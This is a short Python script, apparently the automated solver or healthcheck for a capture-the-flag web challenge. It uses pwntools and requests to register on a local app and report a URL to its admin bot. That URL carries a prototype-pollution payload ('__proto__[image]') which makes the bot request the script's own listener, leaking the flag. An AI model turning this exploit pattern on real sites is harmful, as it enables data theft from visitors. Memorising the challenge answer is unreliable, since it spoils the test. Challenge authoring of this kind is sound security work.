#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import random
import string
import base64
import urllib.parse
from pwn import *

username = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
l = listen()
vuln_url = "http://localhost:1337"
local_url = f"http://localhost:{l.lport}"
session = requests.session()


# register & login
user_data = {"username": username, "password": password}
session.post(vuln_url + "/register", data=user_data)
session.post(vuln_url + "/login", data=user_data)

# report
session.post(vuln_url + "/report", data={"url": f"http://localhost:1337/fancy?q=idek{{sm0l_f1ag_4_u}}&__proto__[image]=x&__proto__[image]={local_url}/idek{{sm0l_f1ag_4_u}}"})

_ = l.wait_for_connection()
data = l.readuntil('HTTP/1.1')

if b'idek%7Bsm0l_f1ag_4_u%7D' in data:
    exit(0)
exit(1)
